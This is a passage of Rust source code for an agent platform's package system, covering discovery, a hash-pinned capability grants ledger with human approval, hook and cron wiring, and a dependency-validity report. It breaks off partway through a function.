//! packages/ — skills, clients, actors (docs/bus.md). Replaces v1's skills/
//! + handlers.d/.
//!
//! Discovery is not authority. A package on the path is *visible*; its
//! manifest is a standing request. Capabilities exist only as approved rows
//! in the grants ledger, pinned to the manifest hash — edit the manifest and
//! the delta re-enters pending while unchanged values carry over
//! (browser-extension re-prompt semantics). Approved capabilities attach
//! live: the dispatcher and broker query the ledger, not a compiled routing
//! table, so there is no enable/disable lifecycle — only approve/revoke.

use crate::manifest::{self, LoadedManifest, SkillMeta, ThrottleDecl};
use crate::paths::Root;
use crate::profile;
use anyhow::{bail, Result};
use rusqlite::{params, Connection, OptionalExtension};
use serde::Serialize;
use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;

pub struct Package {
    pub name: String,
    pub dir: PathBuf,
    pub manifest: Option<LoadedManifest>,
    pub meta: Option<SkillMeta>,
}

/// Ordered lanius path from the instance profile. Each entry may be a kit dir
/// (contains packages/) or a package dir directly. Relative entries resolve
/// against the root. First hit wins by name — systemd unit load path semantics,
/// shadowing included.
pub fn package_path(root: &Root) -> Vec<PathBuf> {
    package_path_for_profile(root, "default")
}

/// Ordered lanius path for a profile after parent expansion.
pub fn package_path_for_profile(root: &Root, profile_name: &str) -> Vec<PathBuf> {
    let entries: Vec<String> = profile::effective_elanus_path(root, profile_name)
        .unwrap_or_else(|_| vec!["packages".into()]);
    paths_from_entries(root, entries)
}

fn paths_from_entries(root: &Root, entries: Vec<String>) -> Vec<PathBuf> {
    entries
        .into_iter()
        .map(|e| {
            let p = PathBuf::from(&e);
            if p.is_absolute() {
                p
            } else {
                root.dir.join(p)
            }
        })
        .map(|p| {
            let kit_packages = p.join("packages");
            if kit_packages.is_dir() {
                kit_packages
            } else {
                p
            }
        })
        .collect()
}

/// All visible packages, shadowed and name-sorted. A manifest that fails to
/// parse makes the package visible-but-inert (loudly): a broken request
/// must not be a silent disappearance.
pub fn discover(root: &Root) -> Result<Vec<Package>> {
    discover_from_paths(package_path(root))
}

pub fn discover_for_profile(root: &Root, profile_name: &str) -> Result<Vec<Package>> {
    // M3 (docs/handoffs/chat-rendering.md): a package whose manifest sets
    // `inherit_to_subagents = false` is dropped from a child's visible set when
    // it is reachable ONLY because the child resolved the literal "$parent".
    // Packages the child reaches through its OWN (non-$parent) path entries are
    // always kept, even if they carry the flag. This is visibility only.
    let (own, _inherited) = profile::effective_elanus_path_split(root, profile_name)
        .unwrap_or_else(|_| (vec!["packages".into()], Vec::new()));
    let own_names: std::collections::BTreeSet<String> =
        discover_from_paths(paths_from_entries(root, own))?
            .into_iter()
            .map(|p| p.name)
            .collect();
    let all = discover_from_paths(package_path_for_profile(root, profile_name))?;
    let mut visible: Vec<Package> = all
        .into_iter()
        .filter(|p| {
            // Keep unless: inherited-only AND manifest opted out of inheritance.
            if own_names.contains(&p.name) {
                return true;
            }
            match &p.manifest {
                Some(lm) => lm.manifest.inherit_to_subagents,
                // No/broken manifest can't opt out; default is inherit.
                None => true,
            }
        })
        .collect();
    extend_run_scoped(root, &mut visible)?;
    Ok(visible)
}

/// Env carrying the run-scoped visibility extension
/// (docs/handoffs/agent-launching.md M2): a comma-separated list of package
/// names a launch asked to make visible for THIS run only. Set by the exec side
/// from the spawn/launch_agent payload; unset in every other context (CLI
/// catalog, daemon dispatch of unrelated runs). Visibility only — the package's
/// bus capabilities stay gated by the grants ledger.
pub const RUN_SCOPED_PACKAGES_ENV: &str = "LANIUS_WITH_PACKAGES";

fn run_scoped_package_names() -> std::collections::BTreeSet<String> {
    std::env::var(RUN_SCOPED_PACKAGES_ENV)
        .ok()
        .map(|v| {
            v.split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

/// Union in any run-scoped extension packages not already visible, sourced from
/// the instance-wide package path (the launcher's own universe). A launch may
/// only widen to packages the instance actually installs; a name that resolves
/// to nothing on disk is silently a no-op (the launch-time validation in
/// `agentcli` is where an unknown/un-granted name is rejected loudly). Re-sorts
/// by name so the returned order stays stable.
fn extend_run_scoped(root: &Root, visible: &mut Vec<Package>) -> Result<()> {
    let extra = run_scoped_package_names();
    if extra.is_empty() {
        return Ok(());
    }
    let present: std::collections::BTreeSet<String> =
        visible.iter().map(|p| p.name.clone()).collect();
    for pkg in discover_from_paths(package_path(root))? {
        if extra.contains(&pkg.name) && !present.contains(&pkg.name) {
            visible.push(pkg);
        }
    }
    visible.sort_by(|a, b| a.name.cmp(&b.name));
    Ok(())
}

/// Is a package "granted" for run-scoped visibility extension
/// (docs/handoffs/agent-launching.md M2, wonky bit 1)? True when the human has
/// approved it: no capability request under its current manifest hash is still
/// pending, and — if it declares any capabilities — at least one is approved. A
/// pure-skill package (no manifest, nothing to approve) is trivially granted.
/// Widening to a granted package adds VISIBILITY only; the grants ledger still
/// gates what it may do on the bus, so this is never an authority grant.
pub fn is_granted(conn: &Connection, package: &str) -> Result<bool> {
    let Some(hash) = crate::db::kv_get(conn, &format!("pkg_hash:{package}"))? else {
        // No recorded hash: a manifest-less (pure-skill) package, or one never
        // synced. Granted only if it carries no grant rows at all.
        let rows: i64 = conn.query_row(
            "SELECT COUNT(*) FROM grants WHERE package=?1",
            [package],
            |r| r.get(0),
        )?;
        return Ok(rows == 0);
    };
    let pending: i64 = conn.query_row(
        "SELECT COUNT(*) FROM grants WHERE package=?1 AND manifest_hash=?2 AND state='requested'",
        params![package, hash],
        |r| r.get(0),
    )?;
    if pending > 0 {
        return Ok(false);
    }
    let total: i64 = conn.query_row(
        "SELECT COUNT(*) FROM grants WHERE package=?1 AND manifest_hash=?2",
        params![package, hash],
        |r| r.get(0),
    )?;
    if total == 0 {
        return Ok(true);
    }
    let approved: i64 = conn.query_row(
        "SELECT COUNT(*) FROM grants WHERE package=?1 AND manifest_hash=?2 AND state='approved'",
        params![package, hash],
        |r| r.get(0),
    )?;
    Ok(approved > 0)
}

/// Built-in agent tools to WITHHOLD from a profile's tool array (M3,
/// docs/handoffs/chat-rendering.md). A built-in tool is "gated" when some
/// package declares it in `provides_builtin_tools`; it is then available only
/// when a package that provides it is VISIBLE to the profile. The returned set
/// is the gated tools whose owning package(s) are all invisible to this
/// profile, so excluding the package (e.g. a worker subagent under `$parent`
/// dropping the comms package) actually removes the tool. Tools no package
/// gates are never in this set (they stay always-available). Fail-open on a
/// discovery error: better to leave a tool present than to silently strip it.
pub fn withheld_builtin_tools(
    root: &Root,
    profile_name: &str,
) -> std::collections::BTreeSet<String> {
    let owned = |pkgs: &[Package]| -> std::collections::BTreeSet<String> {
        pkgs.iter()
            .filter_map(|p| p.manifest.as_ref())
            .flat_map(|lm| lm.manifest.provides_builtin_tools.iter().cloned())
            .collect()
    };
    // Universe = packages this profile would reach if the inherit_to_subagents
    // exclusion were ignored (the full $parent-expanded path, pre-filter). A
    // tool is "gated" only when such a reachable package owns it — so a tool
    // whose package isn't installed for this profile at all is never withheld
    // (it was simply never on offer; M1's default agent keeps send_message even
    // in a root that didn't link the comms kit). Visible = the post-filter set.
    let universe = match discover_from_paths(package_path_for_profile(root, profile_name)) {
        Ok(p) => p,
        Err(_) => return std::collections::BTreeSet::new(),
    };
    let visible = match discover_for_profile(root, profile_name) {
        Ok(p) => p,
        Err(_) => return std::collections::BTreeSet::new(),
    };
    let gated = owned(&universe);
    let provided_visible = owned(&visible);
    gated.difference(&provided_visible).cloned().collect()
}

fn discover_from_paths(paths: Vec<PathBuf>) -> Result<Vec<Package>> {
    let mut by_name: BTreeMap<String, Package> = BTreeMap::new();
    for dir in paths {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut entries: Vec<_> = entries.filter_map(|e| e.ok()).collect();
        entries.sort_by_key(|e| e.file_name());
        for e in entries {
            let p = e.path();
            if !p.is_dir() {
                continue;
            }
            let name = e.file_name().to_string_lossy().to_string();
            // The name becomes a topic segment (obs/package/<name>/...), a grant
            // ledger value, and a sql key. A directory may legally be named
            // with MQTT wildcards ("+", "#"); such a package's status floor
            // filter would match every other package's subtree. Reject names
            // that are not a single valid topic level, loudly.
            if !crate::topic::valid_name(&name) || name.contains('/') {
                eprintln!("[packages] ignoring package with invalid name {name:?} (must be one topic level, no + # /)");
                continue;
            }
            if by_name.contains_key(&name) {
                continue; // shadowed by an earlier path entry
            }
            let manifest = match manifest::load(&p) {
                Ok(m) => m,
                Err(err) => {
                    eprintln!("[packages] {name}: manifest error, package inert: {err:#}");
                    None
                }
            };
            by_name.insert(
                name.clone(),
                Package {
                    manifest,
                    meta: manifest::skill_md(&p),
                    name,
                    dir: p,
                },
            );
        }
    }
    Ok(by_name.into_values().collect())
}

pub fn find(root: &Root, name: &str) -> Result<Package> {
    discover(root)?
        .into_iter()
        .find(|p| p.name == name)
        .ok_or_else(|| anyhow::anyhow!("no such package on the path: {name}"))
}

/// Sync the ledger with what's on disk: register requests for every
/// discovered manifest under its current hash, carrying approvals forward
/// for (kind, value) pairs whose latest decision under a previous hash was
/// 'approved'. Also records the current hash (kv pkg_hash:<name>) — the
/// single source the dispatcher and broker key ACL lookups on — and
/// re-syncs hook/cron wiring from approved capabilities.
pub fn sync(root: &Root, conn: &Connection) -> Result<()> {
    for pkg in discover(root)? {
        let Some(lm) = &pkg.manifest else {
            // No manifest (or broken): no requests, and anything previously
            // keyed to this name keeps its old hash rows — inert either way,
            // because pkg_hash goes stale only if it once existed.
            continue;
        };
        crate::db::kv_set(conn, &format!("pkg_hash:{}", pkg.name), &lm.hash)?;
        let m = &lm.manifest;
        let requests: Vec<(&str, &String)> = m
            .request
            .subscribe
            .iter()
            .map(|v| ("subscribe", v))
            .chain(m.request.publish.iter().map(|v| ("publish", v)))
            .chain(m.request.blocking.iter().map(|v| ("blocking", v)))
            .chain(m.request.fs_write.iter().map(|v| ("fs_write", v)))
            // A [[stage]] declaration IS the request — a context transform
            // runs only approved (docs/context.md), same shape as hooks
            // riding the 'blocking' kind.
            .chain(m.stage.iter().map(|s| ("stage", &s.name)))
            // An [[mcp]] server likewise: third-party tools enter the
            // model's tool array only approved (src/mcp.rs).
            .chain(m.mcp.iter().map(|s| ("mcp", &s.name)))
            // A [[tool]] declaration IS the request: the tool folds into an
            // agent's array only approved + visible (src/pkgtool.rs).
            .chain(m.tool.iter().map(|t| ("tool", &t.name)))
            .collect();
        // process.http = true is likewise a request: serving an HTTP
        // endpoint (loopback, harness-negotiated port) is a capability the
        // human approves (docs/security.md entry 10).
        let http_serve = "serve".to_string();
        let mut requests = requests;
        if m.process.as_ref().is_some_and(|p| p.http) {
            requests.push(("http", &http_serve));
        }
        for (kind, value) in requests {
            if matches!(kind, "subscribe" | "publish") && !crate::topic::valid_filter(value) {
                eprintln!(
                    "[packages] {}: invalid {kind} filter {value:?}, skipped",
                    pkg.name
                );
                continue;
            }
            // Already have a row under this hash? Leave its state alone.
            let exists: Option<i64> = conn
                .query_row(
                    "SELECT id FROM grants WHERE package=?1 AND manifest_hash=?2 AND kind=?3 AND value=?4",
                    params![pkg.name, lm.hash, kind, value],
                    |r| r.get(0),
                )
                .optional()?;
            if exists.is_some() {
                continue;
            }
            // Carry an approval forward iff the latest decision for this
            // (kind, value) under the SAME code_hash was 'approved'. Keying on
            // code_hash is what makes the script-hash pin real: a manifest-only
            // edit keeps code_hash, so unchanged requests carry (only the delta
            // re-prompts); a script edit changes code_hash, so nothing matches
            // and every capability re-enters review with the new code.
            let carried: Option<String> = conn
                .query_row(
                    "SELECT state FROM grants WHERE package=?1 AND kind=?2 AND value=?3 AND code_hash=?4
                     ORDER BY id DESC LIMIT 1",
                    params![pkg.name, kind, value, lm.code_hash],
                    |r| r.get(0),
                )
                .optional()?;
            if carried.as_deref() == Some("approved") {
                conn.execute(
                    "INSERT INTO grants(package, manifest_hash, code_hash, kind, value, state, decided_at, decided_by)
                     VALUES (?1, ?2, ?3, ?4, ?5, 'approved', strftime('%Y-%m-%dT%H:%M:%fZ','now'), 'carried')",
                    params![pkg.name, lm.hash, lm.code_hash, kind, value],
                )?;
            } else {
                conn.execute(
                    "INSERT INTO grants(package, manifest_hash, code_hash, kind, value) VALUES (?1, ?2, ?3, ?4, ?5)",
                    params![pkg.name, lm.hash, lm.code_hash, kind, value],
                )?;
            }
        }
        sync_wiring(conn, &pkg, lm)?;
        for (pat, t) in &m.throttle {
            upsert_throttle(conn, pat, t)?;
        }
    }
    Ok(())
}

/// Hooks and crons are *wiring*, not capability: the capability is the
/// approved 'blocking' point (hooks) / 'publish' filter (cron emits, checked
/// at fire time). Re-derived from the manifest on every sync so approval
/// flips attach and detach live.
fn sync_wiring(conn: &Connection, pkg: &Package, lm: &LoadedManifest) -> Result<()> {
    let m = &lm.manifest;
    conn.execute("DELETE FROM hooks WHERE skill = ?1", [&pkg.name])?;
    for h in &m.hook {
        if !manifest::HOOK_POINTS.contains(&h.point.as_str()) {
            eprintln!(
                "[packages] {}: unknown hook point {:?}, skipped",
                pkg.name, h.point
            );
            continue;
        }
        if h.on_timeout != "allow" && h.on_timeout != "deny" {
            eprintln!(
                "[packages] {}: hook on_timeout must be allow|deny, skipped",
                pkg.name
            );
            continue;
        }
        if !crate::topic::valid_filter(&h.match_filter) {
            eprintln!(
                "[packages] {}: invalid hook match filter, skipped",
                pkg.name
            );
            continue;
        }
        if !is_approved(conn, &pkg.name, "blocking", &h.point)? {
            continue; // requested but not granted: the hook does not exist
        }
        let script = pkg.dir.join(&h.run);
        if !script.exists() {
            eprintln!(
                "[packages] {}: hook script {} missing, skipped",
                pkg.name,
                script.display()
            );
            continue;
        }
        make_executable(&script).ok();
        conn.execute(
            "INSERT INTO hooks(skill, point, run, ord, timeout_ms, on_timeout, match_filter)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            params![
                pkg.name,
                h.point,
                script.display().to_string(),
                h.order,
                h.timeout_ms as i64,
                h.on_timeout,
                h.match_filter
            ],
        )?;
    }
    // Crons keep their rows (last_fired state survives approval flips);
    // the publish capability is enforced when they fire.
    use std::str::FromStr as _;
    for c in &m.cron {
        if croner::Cron::from_str(&c.schedule).is_err() {
            eprintln!(
                "[packages] {}: bad cron schedule {:?}, skipped",
                pkg.name, c.schedule
            );
            continue;
        }
        let payload = c
            .payload
            .as_ref()
            .map(|v| manifest::toml_to_json(v).to_string());
        conn.execute(
            "INSERT INTO crons(skill, schedule, emit_type, payload) VALUES (?1, ?2, ?3, ?4)
             ON CONFLICT(skill, emit_type, schedule) DO UPDATE SET payload = ?4",
            params![pkg.name, c.schedule, c.emit, payload],
        )?;
    }
    // Drop cron rows the manifest no longer declares.
    let declared: Vec<String> = m
        .cron
        .iter()
        .map(|c| format!("{}\u{1}{}", c.emit, c.schedule))
        .collect();
    let existing: Vec<(i64, String, String)> = {
        let mut stmt = conn.prepare("SELECT id, emit_type, schedule FROM crons WHERE skill=?1")?;
        let r = stmt
            .query_map([&pkg.name], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        r
    };
    for (id, emit, schedule) in existing {
        if !declared.contains(&format!("{emit}\u{1}{schedule}")) {
            conn.execute("DELETE FROM crons WHERE id=?1", [id])?;
        }
    }
    Ok(())
}

/// Decide every 'requested' row under the package's current hash.
/// All-or-nothing per package for now; the printout is the review surface.
pub fn decide(root: &Root, conn: &Connection, name: &str, approve: bool, by: &str) -> Result<()> {
    let pkg = find(root, name)?;
    let Some(lm) = &pkg.manifest else {
        bail!("{name} has no lanius.toml — nothing to decide");
    };
    sync(root, conn)?; // make sure current-hash rows exist first
                       // Approve-time [[tool]] collision refusal (docs/handoffs/kb-search.md M0):
                       // a tool name is a bare, global handle in the agent's array, so at most one
                       // approved holder may exist and none may shadow a kernel builtin. Refuse
                       // LOUDLY, naming the current holder, BEFORE flipping any rows — the human
                       // disables/revokes the incumbent first. This is exactly the engine-swap
                       // ergonomic: agents never see two engines racing for one tool name.
    if approve {
        for t in &lm.manifest.tool {
            if crate::exec::KERNEL_TOOL_NAMES.contains(&t.name.as_str()) {
                bail!(
                    "{name}: tool {:?} shadows a kernel builtin — refusing (rename the tool)",
                    t.name
                );
            }
            if let Some(holder) = approved_tool_holder(conn, &t.name, name)? {
                bail!(
                    "{name}: tool {:?} is already provided by the approved package {holder:?} — \
                     revoke/disable {holder} first, then approve {name} (one live holder per tool)",
                    t.name
                );
            }
        }
    }
    let target = if approve { "approved" } else { "revoked" };
    let from = if approve { "requested" } else { "approved" };
    let rows: Vec<(String, String)> = {
        let mut stmt = conn.prepare(
            "SELECT kind, value FROM grants
             WHERE package=?1 AND manifest_hash=?2 AND state=?3 ORDER BY kind, value",
        )?;
        let r = stmt
            .query_map(params![name, lm.hash, from], |r| Ok((r.get(0)?, r.get(1)?)))?
            .collect::<rusqlite::Result<Vec<_>>>()?;
        r
    };
    // The approval gesture re-pins MCP tool descriptions even when no grant
    // rows are pending — "review and `lanius approve` again" is the cure for
    // a server whose tools changed (src/mcp.rs TOFU pin), and that package's
    // grants are typically already approved.
    if approve {
        crate::mcp::clear_pins(conn, name)?;
    }
    if rows.is_empty() {
        println!("{name}: nothing {from}");
        return Ok(());
    }
    conn.execute(
        "UPDATE grants SET state=?1, decided_at=strftime('%Y-%m-%dT%H:%M:%fZ','now'), decided_by=?2
         WHERE package=?3 AND manifest_hash=?4 AND state=?5",
        params![target, by, name, lm.hash, from],
    )?;
    for (kind, value) in &rows {
        println!("{target} {name} {kind} {value}");
    }
    sync(root, conn)?; // hooks attach/detach live
    Ok(())
}

/// Any OTHER package that currently holds an APPROVED `[[tool]]` grant for
/// `tool` under its recorded current hash (`pkg_hash:<name>`), for the
/// approve-time collision refusal. `None` = the name is free to approve.
fn approved_tool_holder(conn: &Connection, tool: &str, exclude: &str) -> Result<Option<String>> {
    let holder: Option<String> = conn
        .query_row(
            "SELECT g.package FROM grants g
             JOIN kv ON kv.key = 'pkg_hash:' || g.package
             WHERE g.kind='tool' AND g.value=?1 AND g.state='approved'
               AND g.manifest_hash = kv.value AND g.package <> ?2
             LIMIT 1",
            params![tool, exclude],
            |r| r.get(0),
        )
        .optional()?;
    Ok(holder)
}

pub fn is_approved(conn: &Connection, package: &str, kind: &str, value: &str) -> Result<bool> {
    let Some(hash) = crate::db::kv_get(conn, &format!("pkg_hash:{package}"))? else {
        return Ok(false);
    };
    let n: i64 = conn.query_row(
        "SELECT COUNT(*) FROM grants
         WHERE package=?1 AND manifest_hash=?2 AND kind=?3 AND value=?4 AND state='approved'",
        params![package, hash, kind, value],
        |r| r.get(0),
    )?;
    Ok(n > 0)
}

/// Approved values of one kind under the package's current hash.
pub fn approved(conn: &Connection, package: &str, kind: &str) -> Result<Vec<String>> {
    let Some(hash) = crate::db::kv_get(conn, &format!("pkg_hash:{package}"))? else {
        return Ok(Vec::new());
    };
    approved_under(conn, package, &hash, kind)
}

/// Approved values keyed on an explicit hash. Callers holding a manifest
/// freshly loaded from disk pass lm.hash: that pins the approval to the
/// bytes about to execute, with no window between an edit and the next
/// sync — load-bearing for LINKED packages, whose code can change under a
/// running daemon (docs/security.md entry 9).
pub fn approved_under(
    conn: &Connection,
    package: &str,
    hash: &str,
    kind: &str,
) -> Result<Vec<String>> {
    let mut stmt = conn.prepare(
        "SELECT value FROM grants
         WHERE package=?1 AND manifest_hash=?2 AND kind=?3 AND state='approved' ORDER BY value",
    )?;
    let r = stmt
        .query_map(params![package, hash, kind], |r| r.get(0))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(r)
}

/// Re-sync iff any discovered manifest's hash differs from the ledger's
/// recorded pkg_hash. The dispatcher calls this each tick: reads + hashing
/// only on the steady state, writes only when something actually changed —
/// so an upstream edit to a linked package heals the kv (and re-enters
/// review) within one tick instead of at the next daemon restart.
pub fn sync_if_drifted(root: &Root, conn: &Connection) -> Result<()> {
    for pkg in discover(root)? {
        let Some(lm) = &pkg.manifest else { continue };
        if crate::db::kv_get(conn, &format!("pkg_hash:{}", pkg.name))?.as_deref()
            != Some(lm.hash.as_str())
        {
            return sync(root, conn);
        }
    }
    Ok(())
}

/// Does this package's topic match any approved filter of `kind`?
/// The broker's publish ACL and the cron gate both use this.
pub fn may(conn: &Connection, package: &str, kind: &str, topic: &str) -> Result<bool> {
    Ok(approved(conn, package, kind)?
        .iter()
        .any(|f| crate::topic::matches(f, topic)))
}

/// The exec-mode handlers for an event topic: every discovered package with
/// an approved subscribe filter matching it, ordered by process.order then
/// name. Returns (package name, absolute script path).
pub fn matching_exec_handlers(
    root: &Root,
    conn: &Connection,
    etype: &str,
) -> Result<Vec<(String, PathBuf)>> {
    let mut out: Vec<(u32, String, PathBuf)> = Vec::new();
    for pkg in discover(root)? {
        let Some(lm) = &pkg.manifest else { continue };
        let Some(proc_) = &lm.manifest.process else {
            continue;
        };
        if proc_.mode != "exec" {
            continue;
        }
        // Pin on the FRESH hash (the bytes about to run), not the kv: an
        // edited script must be stale at dispatch even before any sync.
        let hit = approved_under(conn, &pkg.name, &lm.hash, "subscribe")?
            .iter()
            .any(|f| crate::topic::matches(f, etype));
        if hit {
            out.push((proc_.order, pkg.name.clone(), pkg.dir.join(&proc_.run)));
        }
    }
    out.sort_by(|a, b| (a.0, &a.1).cmp(&(b.0, &b.1)));
    Ok(out.into_iter().map(|(_, n, p)| (n, p)).collect())
}

pub fn upsert_throttle(conn: &Connection, pat: &str, t: &ThrottleDecl) -> Result<()> {
    conn.execute(
        "INSERT INTO throttles(event_type, max_concurrent, rate_per_min, llm_tokens_per_hour, coalesce)
         VALUES (?1, ?2, ?3, ?4, ?5)
         ON CONFLICT(event_type) DO UPDATE SET
           max_concurrent = ?2, rate_per_min = ?3, llm_tokens_per_hour = ?4, coalesce = ?5",
        params![
            pat,
            t.max_concurrent,
            t.rate_per_min,
            t.llm_tokens_per_hour,
            t.coalesce.unwrap_or(true) as i64
        ],
    )?;
    Ok(())
}

fn make_executable(p: &std::path::Path) -> Result<()> {
    // Unix: chmod +x. Windows: no-op (no exec bit; script run-ability is the
    // M3 "require a POSIX shell" concern).
    crate::platform::set_executable(p)?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Package dependencies: the deterministic (no-LLM) validity check + the
// tiny-LLM-steering remediation report (docs/handoffs/package-dependencies.md
// M2/M3). `validate` composes ONLY existing reads (discover / is_granted /
// config_repo::get_key) into a set/graph question; the report pairs each problem
// with its exact fix command so a small model can run the fixes top-to-bottom.
// ---------------------------------------------------------------------------

/// The machine kind of a dependency-validity problem. Serialized snake_case so
/// the `--json` report is stable for the helper/UI.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ProblemKind {
    /// A declared dependency is not installed anywhere on the instance.
    PackageNotInstalled,
    /// A declared dependency is installed but not on this profile's path.
    PackageOffPath,
    /// A declared dependency is visible but not approved (granted).
    PackageNotApproved,
    /// A visible package's own `required` config key is unset.
    ConfigKeyUnset,
    /// A cycle among `[requires] packages` edges.
    DependencyCycle,
}

/// One dependency-validity problem: the offending package, a machine kind, a
/// one-line human description, and — the load-bearing field — an EXACT fix
/// command (or the reused enable/install guidance for an off-path/absent dep).
#[derive(Debug, Clone, Serialize)]
pub struct Problem {
    /// The package the problem is attributed to (the one carrying the unmet dep,
    /// the unset config key, or the first node of a cycle).
    pub package: String,
    /// The dependency name, for the package-dependency kinds; `None` for
    /// `ConfigKeyUnset` and `DependencyCycle`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub requires: Option<String>,
    pub kind: ProblemKind,
    pub message: String,
    pub fix: String,
}

/// The result of a validity check: the problems (empty = valid) plus enough
/// context to render a self-contained report.
pub struct ValidityReport {
    pub profile: String,
    /// Number of visible packages the check covered (for the OK line).
    pub package_count: usize,
    pub problems: Vec<Problem>,
}

impl ValidityReport {
    pub fn is_ok(&self) -> bool {
        self.problems.is_empty()
    }

    /// The exact re-check command a reader runs after applying the fixes — part
    /// of what makes the report self-contained.
    pub fn recheck(&self) -> String {
        format!("elanus packages check --profile {}", self.profile)
    }

    /// The human report: one clear OK line when valid, else a numbered
    /// problem+fix list shaped like a remediation prompt (one problem, one fix
    /// line; ends with the exact re-check command).
    pub fn human(&self) -> String {
        if self.problems.is_empty() {
            return format!(
                "OK — profile {:?}: all {} packages' dependencies satisfied.",
                self.profile, self.package_count
            );
        }
        let mut out = format!(
            "FAIL — {} problem{} in profile {:?}. Fix each, in order, then re-run the\n\
             re-check command at the bottom.\n",
            self.problems.len(),
            if self.problems.len() == 1 { "" } else { "s" },
            self.profile,
        );
        for (i, p) in self.problems.iter().enumerate() {
            out.push_str(&format!("\n[{}] {}\n    fix: {}\n", i + 1, p.message, p.fix));
        }
        out.push_str(&format!("\nre-check: {}\n", self.recheck()));
        out
    }

    /// The stable `--json` shape the helper/UI relays. Each problem item carries
    /// `{package, requires?, kind, message, fix, recheck}`.
    pub fn to_json(&self) -> serde_json::Value {
        let recheck = self.recheck();
        let problems: Vec<serde_json::Value> = self
            .problems
            .iter()
            .map(|p| {
                let mut v = serde_json::to_value(p).unwrap_or(serde_json::Value::Null);
                if let Some(obj) = v.as_object_mut() {
                    obj.insert("recheck".into(), serde_json::Value::String(recheck.clone()));
                }
                v
            })
            .collect();
        serde_json::json!({
            "profile": self.profile,
            "ok": self.is_ok(),
            "package_count": self.package_count,
            "recheck": recheck,
            "problems": problems,
        })
    }
}

/// The deterministic, NO-LLM dependency validity check
/// (docs/handoffs/package-dependencies.md M2). Composes only existing reads:
/// the visible set (`discover_for_profile`), the universe (`discover`), the
/// approval test (`is_granted`), the existing required-config-key setup gate
/// (`config_repo::get_key`), and cycle detection over `[requires] packages`
/// edges. Pure: run twice on the same state, byte-identical.
pub fn validate(root: &Root, conn: &Connection, profile: &str) -> Result<ValidityReport> {
    let visible_pkgs = discover_for_profile(root, profile)?;
    let visible: BTreeSet<String> = visible_pkgs.iter().map(|p| p.name.clone()).collect();
    let universe_pkgs = discover(root)?;
    let universe: BTreeSet<String> = universe_pkgs.iter().map(|p| p.name.clone()).collect();

    // Dependency edges over the UNIVERSE, restricted to installed targets — the
    // graph the depth-ordering and cycle detection walk.
    let mut edges: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for p in &universe_pkgs {
        if let Some(lm) = &p.manifest {
            let deps: Vec<String> = lm
                .manifest
                .requires
                .packages
                .iter()
                .filter(|d| universe.contains(*d))
                .cloned()
                .collect();
            edges.insert(p.name.clone(), deps);
        }
    }

    let mut problems: Vec<Problem> = Vec::new();

    // Package-dependency + config-key problems over the VISIBLE set.
    for p in &visible_pkgs {
        let Some(lm) = &p.manifest else { continue };
        for dep in &lm.manifest.requires.packages {
            if !universe.contains(dep) {
                problems.push(Problem {
                    package: p.name.clone(),
                    requires: Some(dep.clone()),
                    kind: ProblemKind::PackageNotInstalled,
                    message: format!(
                        "package `{}` requires `{}`, which is not installed on this instance.",
                        p.name, dep
                    ),
                    fix: format!(
                        "install `{dep}` (it is not on this instance — `elanus agent catalog` \
                         lists what is available), then add it to the {profile:?} profile's path"
                    ),
                });
            } else if !visible.contains(dep) {
                problems.push(Problem {
                    package: p.name.clone(),
                    requires: Some(dep.clone()),
                    kind: ProblemKind::PackageOffPath,
                    message: format!(
                        "package `{}` requires `{}`, which is installed but not on the {:?} \
                         profile's path.",
                        p.name, dep, profile
                    ),
                    fix: crate::discover::enable_guidance(dep, profile),
                });
            } else if !is_granted(conn, dep)? {
                problems.push(Problem {
                    package: p.name.clone(),
                    requires: Some(dep.clone()),
                    kind: ProblemKind::PackageNotApproved,
                    message: format!(
                        "package `{}` requires `{}`, which is installed but not approved.",
                        p.name, dep
                    ),
                    fix: format!("elanus approve {dep}"),
                });
            }
        }
        // The config half REUSES the existing required-config-key setup gate: a
        // visible package with a `required` key unset is inert, and the fix is
        // the standard `config set` (no new field, no new enforcement).
        for key in &lm.manifest.config.keys {
            if key.required && crate::config_repo::get_key(root, &p.name, &key.name)?.is_none() {
                problems.push(Problem {
                    package: p.name.clone(),
                    requires: None,
                    kind: ProblemKind::ConfigKeyUnset,
                    message: format!(
                        "package `{}` needs config `{}.{}`, which is unset.",
                        p.name, p.name, key.name
                    ),
                    fix: format!("elanus config set {} {} <value>", p.name, key.name),
                });
            }
        }
    }

    // Cycle detection over the universe edges (light DFS, no SCC machinery).
    for cyc in find_cycles(&edges) {
        // cyc = [a, b, …, a]; the closing edge (second-to-last → last) is the one
        // to remove to break the loop.
        let path_str = cyc.join(" → ");
        let from = cyc.get(cyc.len().saturating_sub(2)).cloned().unwrap_or_default();
        let to = cyc.last().cloned().unwrap_or_default();
        problems.push(Problem {
            package: cyc.first().cloned().unwrap_or_default(),
            requires: None,
            kind: ProblemKind::DependencyCycle,
            message: format!(
                "dependency cycle: {path_str}. Packages must not require each other in a loop."
            ),
            fix: format!("remove `{to}` from `[requires] packages` in {from}/lanius.toml"),
        });
    }

    // Order so running the fixes top-to-bottom converges: cycles first (they
    // block everything), then package problems by dependency depth (a dep with
    // no unmet prerequisites first — approve phonebook before recall), then
    // config keys last. Deterministic tie-break on names.
    let depth = compute_depths(&edges);
    problems.sort_by(|a, b| sort_key(a, &depth).cmp(&sort_key(b, &depth)));

    Ok(ValidityReport {
        profile: profile.to_string(),
        package_count: visible_pkgs.len(),
        problems,
    })
}

/// The stable ordering key for a problem (bucket, dependency-depth, then names).
fn sort_key(p: &Problem, depth: &BTreeMap<String, usize>) -> (u8, usize, String, String) {
    match p.kind {
        ProblemKind::DependencyCycle => (0, 0, p.package.clone(), String::new()),
        ProblemKind::PackageNotInstalled
        | ProblemKind::PackageOffPath
        | ProblemKind::PackageNotApproved => {
            // Order by the depth of the dep being fixed: a dependency that itself
            // has no unmet prerequisites (phonebook: depth 0) is approved before
            // one that depends on it (recall: depth 1).
